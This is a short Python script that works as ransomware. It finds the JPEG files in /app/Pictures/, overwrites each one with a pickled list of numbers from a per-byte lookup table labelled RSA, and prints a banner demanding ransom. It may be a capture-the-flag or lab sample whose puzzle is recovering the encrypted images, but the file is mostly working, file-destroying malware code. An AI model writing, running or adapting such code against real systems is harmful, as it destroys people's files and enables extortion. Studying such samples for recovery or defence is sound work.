import pickle, os
import imghdr
import threading

# n = 22291846172619859445381409012451
# e = 65535

table = [0, 1, 22117485423427188325785671569574, 21660361290872798021040828582003, 9469348979646274376888718242636, 8322888436093620891783856742110, 5024013648075533555374466631008, 15121112628134289752363005336405, 14257098025398216050219487622001, 8234559244034737376758659283519, 12953213869807777109730911255813, 18557256866259645419658184196962, 10830673082869248024827117221478, 20608880212300701744313950656170, 18777691744827829896470812706051, 12994584276437434950897700483859, 10850227183355724599621731699108, 6423128369093217661842262616600, 19948117532064211001750066511892, 7993428132146360830935970802373, 9077272634807676545152966889401, 12793082927629563242086282782173, 1530195961844617587186108217755, 19590494705416950062804901776695, 8441979668758228191808382046484, 11859787335817399784383007485655, 4420190523815138639009601382674, 3246848886952370914112867300739, 14175414512346603933154258220494, 19128515812202169420494541707320, 13200285126733910910950377755776, 15886418380095311460730536504295, 18701979414911906015770835486044, 3446027359742862384107818045972, 19281876809022210622224116253828, 14320704048408672319821626947374, 14698074738919711388772568466496, 5093100393267059014916394274943, 13079952029446069380136135135871, 5820492405362191272398645154903, 3649093009898334645136909691276, 17930953374248433329725907453092, 7661298696656745254647503756194, 21843774516460552264499377780489, 2407540407755009504562765625488, 17635274522890274943852391457805, 406536069078688727193287949431, 15794680211550196783527015778914, 19234452845665559278657113440881, 2702967694099679478857856958887, 2719680891728701404944467623103, 3487324906079325560370358854515, 14588825191469283519234772970537, 21236381711893356152357675889858, 12878235953633869731928014113869, 13609234166690770429353422717129, 21255486025274609247905151823292, 8149707795157503270624472055653, 5052717199203844103520700207710, 5312316817584962807294134819106, 9751164933499977236560143423771, 13523404700626831617335238763529, 8284379451055883021383424815883, 7132030516501022562699151956919, 370275319443158254903745684363, 20203581557117079431399937994657, 12422701136677031044552486687456, 18404978067790785814617864513106, 1489436617160685460584256011077, 17248901991896853321348580188908, 19828818355212517037909079443996, 16123162838261332238367630661131, 19662425294880278925789240298204, 18932531988432105446050623001422, 8255417191385977546660768766640, 6098988255710705249108598768538, 18959719930839621249844472483929, 18780733734624494342443405672205, 18291963516744650213539222740678, 9651869579643183252998241592310, 8189344888758044510443873540463, 5957312515715660564291020454972, 15209945723581266422720668198905, 10296079707420849531664620121322, 11314273426561529134560834968445, 12237065185507997550763027461826, 19280879550095903277166686128023, 14568770957581489501100625685475, 21622267200113507752404390697397, 16481264328661836004007726102998, 3867586854935286130492677102915, 10557235984433208841052250519173, 14372565119279397634180817973793, 7732211852037802267404070608364, 7143855364998833550994688446499, 17469664184854049337118549973883, 9700046298508568093255505557945, 12455019421441472770849214841944, 12825451136572852432798679725742, 19847310318525586665451507125020, 16373478875030308089679499131020, 15713346186173512579979454394545, 9508117610102219779674976510536, 998382245127393141675883556199, 8316571127848202620590969319518, 4486390925341803912731627964280, 19594851831145545613099373023485, 2030427529730116757348413489215, 18380332436438939020053530830915, 11499147198524571359379692450564, 10050845180539910202584484656895, 19909800165337624087224423521095, 20437832816440217087725455873008, 7926246849001865752848418036792, 12883935943937409153692678833470, 13407785899439713550769187719387, 13354462524019047844326180247792, 15089596458403724386927118766086, 10203469491078395026889559776328, 3433286558920957308753570860841, 5694823568063266390184166523151, 19069074982340474111832910122254, 17367087212176838545818306455329, 15963686567162149398485906044971, 22143645894360064407049268949306, 12360695146194875318075055763848, 2392872548270531551984536502424, 21480458202349639775972384946620, 2815543846776017239246277375683, 2936052561959580700334656464552, 7790592076922657113099864665122, 14997450500757680197882112597053, 2798634249852877616143611234613, 16623760243324824122255626260180, 11747774048194679723032496810625, 4016662205107576529852566926082, 12036063755081059790336971790273, 2396476258504758408562280545249, 20896040080579689014233592562349, 15541388123992546779143339389064, 9246748755662088032496150231369, 11926547767847439858742212455645, 8432841717509217629939569425927, 4089130730581698162527540376141, 4687335439133352884459195120960, 11051485919329144007958152513301, 16524068894415280745363870941841, 11170426737115867299827043177576, 1214813754722366399073173995608, 22211090368860418058558212608219, 15620426324774965230637675865654, 14175099773175162926802235341557, 18125472452735231083452679964969, 7108698337530911143127675618316, 16120504757678576559466100353013, 36678958383911223847640801387, 4833117317142927615086397599411, 7380343943271741574279903932894, 1141223362392020777134730824225, 998205574315207653133262526644, 18074782080107563726302982613913, 8251799277672405182101345096128, 8157668035784492995644892374608, 4573644130434371618024427371655, 17431854674634959032446339715954, 2202505252875968620536074822728, 15143893499138878308137549855120, 14396177860695366181834314289861, 2492833885801829620743037430095, 1483802492098726725408373504505, 3754121484019247191093279463213, 8892941080345827670141900988852, 18842697466108364106852479574193, 14770301942210831371306845251246, 19431369286288473552062889374868, 12880019232602424752661537458672, 9321811571937250408770735793529, 2843330889167185268776092105908, 7768857234384200527965771504761, 9869408927839743789202775022071, 19337852312099210978379149594710, 7281232539122413828996942962445, 15110563642128850143668952752409, 2528511446510902493145916091636, 7395456304154765879195049097548, 13259064931659201966226750325379, 10830653950881992336161756367928, 21285080712118236344943003032385, 1823287458356168718827851955949, 5980636711031096359748499630472, 18016040279026678636457287753260, 2545535632865608327368778191844, 9449443991856858986018871200254, 13150831607837927012871180669839, 21540049362636244596316191012846, 12441685847946306640450269384905, 8056260337435358646628172956020, 21629320170924714723225809215264, 4269882484349154122759079493267, 4097477774954703463025137312925, 4979609874362139964954684906085, 8817085884196192960852330763954, 4277429184473552351730548771245, 17882096364720505493822845408568, 3243648418749417797246622182933, 3806989801426833170739052259390, 5061361960378443547920422513535, 19094720799793039767690296902635, 3335126344915295217313592095270, 6392805819483989957442673268708, 10410438394345767395551451713168, 4433700229211984232408446351282, 8125183393315343647630128238134, 13483440682291558774775086264639, 320722411434037697041862126668, 13507133285924640032393643990380, 20265973018459241507445931224350, 608527063692343881777784057678, 599393287747849797252888799606, 4203059676637129204409548851481, 20154944570545184985170493615150, 20933587822479042023519610717388, 12434558513912445170505428865606, 15825451665951540443184330840188, 15447339767129427880861213312328, 21700721504349282256326800389561, 18935160634133682719023951052677, 10479269852027309026466017583396, 2181874753146980605149726701854, 5879966582853103529393909683344, 14232784877297494839095922011050, 6564920998101606887792629306831, 18302774737982185496027998253601, 15323264854466902370631042434658, 6722365352295376514266261089855, 17186147383908741549768280287566, 7436886917724026318395719620303, 9159474332072194837979567303156, 14566780337985882709887901036565, 17138846948427677096336181730613, 4152277816044712249231945250322, 6112898392322429934316030155329, 19964578367480416639461614498785, 6479304312783679592374101076507, 19374853190920416392143961956056, 18030391395143740022858758834148, 10612628483524846124758089323611, 11678232848851234792239939250644, 3722677912316089310353175705487, 5300264106425819406567981848761, 20316153769748869699703086756009, 21211161885349534981497132803005, 18727802565938308999206338912165, 2293553819956446994936800350261, 10457919011550499111381156059050, 7893926884542106649748041269671]

def rsa_encrypt(filename):
    plain_bytes = b''
    with open(filename, 'rb') as f:
        plain_bytes = f.read()
    cipher_int = [table[i] for i in plain_bytes]
    with open(filename, 'wb') as f:
        pickle.dump(cipher_int, f)


def is_valid_image(filename, type=None):
    if type=='jpg':
        with open(filename, 'rb') as f:
            header = f.read(32)  # Read the first 32 bytes
            return imghdr.what(None, header) == 'jpeg'
    else:
        with open(filename, 'rb') as f:
            header = f.read(32)  # Read the first 32 bytes
            return imghdr.what(None, header) is not None


if __name__ == "__main__":
    target = "/app/Pictures/"
    pics = [os.path.join(target, f) for f in os.listdir(target)]
    text = """\
///////////////////////////////////////////////////////////////////////////
////////////////////////////---------ERROR----------///////////////////////
////////////////////------ Give me ransom hahaha -------///////////////////
///////////////////////////////////////////////////////////////////////////
"""
    threads = []
    for pic in pics:
        if is_valid_image(pic, 'jpg'):
            threads.append(threading.Thread(target=rsa_encrypt, args=[pic]))
            threads[-1].start()
        # elif not is_valid_image(pic):
        #     threads.append(threading.Thread(target=rsa_decrypt, args=[pic]))
        #     threads[-1].start()
    for thread in threads:
        thread.join()
    print(text)
